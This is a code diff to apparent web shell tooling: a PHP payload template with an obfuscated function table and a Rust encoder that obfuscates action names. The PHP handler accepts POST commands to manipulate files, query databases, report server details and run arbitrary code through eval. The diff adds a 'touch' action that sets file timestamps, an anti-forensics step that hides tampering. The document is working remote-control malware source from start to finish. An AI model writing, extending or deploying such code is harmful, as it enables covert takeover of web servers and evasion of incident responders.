@@ -1365,6 +1365,10 @@ function run($p) {
     } elseif ($a === 'mkdir') {
         $d = isset($req['p']) ? (string)$req['p'] : '';
         if (!@mkdir($d, 0755, true)) { return '{"ok":false,"error":"mkdir failed"}'; }
+    } elseif ($a === 'touch') {
+        $d = isset($req['p']) ? (string)$req['p'] : '';
+        $t = isset($req['t']) ? (int)$req['t'] : time();
+        if (!@touch($d, $t)) { return '{"ok":false,"error":"touch failed"}'; }
     } elseif ($a === 'dbprobe') {
         $c = isset($req['c']) ? (string)$req['c'] : '';
         $out = @call_user_func('session_db_probe', $c);
@@ -1556,6 +1560,7 @@ function __STORE__($p,$d){global $_g;$v=@$_g[4]($p,@$_g[1]($d));if($v===false)re
 function __DROP__($p){global $_g;$ok=@$_g[6]($p)?@$_g[10]($p):@$_g[9]($p);return $ok?'{"ok":true,"data":null}':'{"ok":false,"error":"delete failed"}';}
 function __MOVE__($f,$t){global $_g;return @$_g[11]($f,$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"rename failed"}';}
 function __MKDIR__($p){global $_g;return @$_g[12]($p,0755,true)?'{"ok":true,"data":null}':'{"ok":false,"error":"mkdir failed"}';}
+function __TOUCH__($p,$t){return @touch($p,(int)$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"touch failed"}';}
 function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>(string)ini_get('disable_functions'))));}
 function __EVALFN__($c){if($c==='')return '{"ok":false,"error":"empty"}';try{ob_start();@eval($c);$o=ob_get_clean();return json_encode(array('ok'=>true,'data'=>$o));}catch(Throwable $t){return json_encode(array('ok'=>false,'error'=>$t->getMessage()));}}
 function __DBP__($c){
@@ -1689,6 +1694,7 @@ if(isset($_POST['formData'])){
         elseif($h==__H_DELETE__){$out=__DROP__(isset($req['p'])?(string)$req['p']:'');}
         elseif($h==__H_RENAME__){$out=__MOVE__(isset($req['f'])?(string)$req['f']:'',isset($req['t'])?(string)$req['t']:'');}
         elseif($h==__H_MKDIR__){$out=__MKDIR__(isset($req['p'])?(string)$req['p']:'');}
+        elseif($h==__H_TOUCH__){$out=__TOUCH__(isset($req['p'])?(string)$req['p']:'',isset($req['t'])?$req['t']:time());}
         elseif($h==__H_DBPROBE__){$out=__DBP__(isset($req['c'])?(string)$req['c']:'');}
         elseif($h==__H_DBQUERY__){$out=__DBQ__(isset($req['c'])?(string)$req['c']:'',isset($req['q'])?(string)$req['q']:'');}
     }
@@ -1858,6 +1864,7 @@ impl PayloadEncoder for NativeEncoder {
                     .replace("__H_DELETE__", &h("delete"))
                     .replace("__H_RENAME__", &h("rename"))
                     .replace("__H_MKDIR__", &h("mkdir"))
+                    .replace("__H_TOUCH__", &h("touch"))
                     .replace("__H_DBPROBE__", &h("dbprobe"))
                     .replace("__H_DBQUERY__", &h("dbquery"));
                 let (decrypt_expr, encrypt_expr, extra_symbols) = match self.crypto {
